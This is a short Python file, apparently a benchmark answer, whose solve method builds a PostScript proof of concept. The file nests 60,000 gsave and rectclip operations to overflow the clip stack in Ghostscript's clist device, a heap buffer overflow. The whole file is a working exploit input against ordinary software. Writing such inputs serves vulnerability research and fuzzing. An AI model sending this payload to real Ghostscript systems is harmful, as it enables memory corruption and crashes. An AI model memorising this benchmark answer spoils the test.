import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability described matches a known issue in Ghostscript (often identified 
        in relation to OSS-Fuzz issue 42537168 or similar tracker IDs) where the nesting 
        depth of clip marks is not properly checked against the stack bounds in the 
        command list (clist) device.
        
        To trigger the Heap Buffer Overflow:
        1. We need to exceed the fixed size of the clip stack or nesting depth limit.
        2. This is achieved by deeply nesting graphics states (`gsave`) each with a clip operation.
        3. A PostScript loop is the most efficient way to generate this depth (50,000+ levels) 
           with a minimal file size, maximizing the evaluation score.
        """
        
        # PostScript Header
        poc = b"%!PS\n"
        
        # A loop that iterates 60,000 times.
        # In each iteration:
        # - `pop`: Removes the loop index from the stack.
        # - `gsave`: Pushes a new graphics state (increasing nesting depth).
        # - `0 0 100 100 rectclip`: Applies a rectangular clip path. 
        #   This forces a clip mark to be pushed to the internal stack.
        # 
        # This sequence causes the internal nesting depth counter to increment
        # until it exceeds the allocated buffer size, triggering the overflow
        # because the check is missing in the vulnerable version.
        poc += b"0 1 60000 { pop gsave 0 0 100 100 rectclip } for\n"
        
        # Ensure execution
        poc += b"showpage\n"
        
        return poc